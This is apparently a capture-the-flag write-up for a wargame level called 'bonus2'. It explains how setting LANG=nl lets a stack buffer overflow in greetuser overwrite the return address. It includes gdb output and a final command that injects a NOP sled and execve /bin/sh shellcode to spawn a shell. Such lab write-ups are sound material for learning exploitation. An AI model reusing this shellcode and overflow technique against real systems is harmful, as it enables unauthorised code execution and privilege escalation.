### Exploit
Here we need to overflow the buffer located in the `greetuser` function.
The buffer in the `main` function is 72 byte long so we can fill it completely.
This buffer is then passed to `greetuser` which will contain a string depending on the `language` variable and the main buffer.
If we don't rewrite the `LANG` env variable the buffer will not overflow enough because the string that will be copied in the buffer is too short.
We need `LANG` to be `nl` so that the string copied in the buffer is long enough so that we can rewrite the return address.

Using the pattern generator with `LANG=nl` we see that the offset needed to rewrite the return address is 23.

```bash
(gdb) disas greetuser
...
   0x08048517 <+147>:	call   0x8048370 <strcat@plt>
   0x0804851c <+152>:	lea    -0x48(%ebp),%eax
...
(gdb) break *0x0804851c
Breakpoint 1 at 0x804851c
(gdb) r test test
Starting program: /home/user/bonus2/bonus2 test test

Breakpoint 1, 0x0804851c in greetuser ()
(gdb) info reg eax
eax            0xbffff630	-1073744336
```

We see that the address of the buffer is `0xbffff630`, we need to add a little offset to not bump into the message copied at the start of the buffer.

### Get access

```bash
export LANG=nl
./bonus2 `python -c "print('\x90' * 40)"` `python -c "print('\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A'*2 + '\x70\xf6\xff\xbf')"`
```